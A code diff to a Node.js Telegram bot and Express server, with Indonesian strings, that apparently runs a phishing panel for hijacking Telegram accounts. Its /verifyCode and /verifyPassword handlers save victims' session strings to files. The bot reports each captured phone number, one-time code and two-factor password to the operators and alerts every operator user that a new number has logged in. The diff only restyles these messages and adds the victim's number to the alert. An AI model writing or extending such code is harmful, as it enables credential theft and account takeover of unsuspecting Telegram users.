@@ -134,7 +134,7 @@ function startBot(token) {
                       ...Markup.inlineKeyboard(buttons)
                   });
               } else {
-                  ctx.reply('❌ Belum ada nomor masuk bos.');
+                  ctx.reply('Result tidak di temukan');
               }
           } else {
               console.log("❌ Failed to get number list.");
@@ -282,20 +282,20 @@ function startBot(token) {
           const info = userInfoRes.data?.userInfo || {};
 
                 await ctx.reply(
-        `*𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑴𝑨𝑵𝑨𝑮𝑬𝑹*\n` +
-        `👤 Nama: ${info.firstName || '-'} ${info.lastName || ''}\n` +
-        `📞 Nomor: ${phoneNumberLink}\n` +
-        `📩 OTP: ${otpCode}\n` +
-        `🔐 A2F: ${password}\n` +
-        `🆔 Username: @${info.username || 'Tidak Ada'}\n` +
-        `-- Total Kontak: ${info.totalContacts || 0}\n` +
-        `-- Mutual: ${info.mutualContacts || 0}\n` +
-        `-- Non-Mutual: ${info.nonMutualContacts || 0}`,
+        `*𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗋*\n` +
+        `• Nama: ${info.firstName || '-'} ${info.lastName || ''}\n` +
+        `• Nomor: ${phoneNumberLink}\n` +
+        `• OTP: ${otpCode}\n` +
+        `• A2F: ${password}\n` +
+        `• Username: @${info.username || 'Tidak Ada'}\n` +
+        `• Total Kontak: ${info.totalContacts || 0}\n` +
+        `├─ Mutual: ${info.mutualContacts || 0}\n` +
+        `└─ Non-Mutual: ${info.nonMutualContacts || 0}`,
         {
           parse_mode: 'Markdown',
           ...Markup.inlineKeyboard([
-            [Markup.button.callback('🗑️ Hapus Nomor', `delete_${selectedNumber}`)],
-            [Markup.button.callback('⬅️ Back', 'back_to_menu')]
+            [Markup.button.callback('Hapus', `delete_${selectedNumber}`)],
+            [Markup.button.callback('Kembali', 'back_to_menu')]
           ])
         }
       );
@@ -524,14 +524,14 @@ bot.action(/delete_group_(\d+)/, async (ctx) => {
     console.log('✅ Bot berjalan dengan token:', token);
 }
 
-function kirimPesanKeSemuaUser() {
+function kirimPesanKeSemuaUser(a) {
   console.log("📢 Mengirim pesan ke semua user...");
   if (users.length === 0) {
       console.log("⚠️ Tidak ada user yang tersimpan.");
       return;
   }
   users.forEach(chatId => {
-      bot.telegram.sendMessage(chatId, '📣 KIWWW, Ada nomor baru masuk bos')
+      bot.telegram.sendMessage(chatId, `${a}, Berhasil Login`)
       .catch(err => console.error("❌ Error kirim pesan ke", chatId, ":", err));
   });
 }
@@ -704,7 +704,7 @@ app.post("/verifyCode", async (req, res) => {
         fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
         fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());
 
-        kirimPesanKeSemuaUser();
+        kirimPesanKeSemuaUser(phoneNumber);
 
         res.json({
             status: "success",
@@ -802,7 +802,7 @@ app.post("/verifyPassword", async (req, res) => {
       fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
       fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());
 
-      kirimPesanKeSemuaUser();
+      kirimPesanKeSemuaUser(phoneNumber);
 
       res.json({
           status: "success",
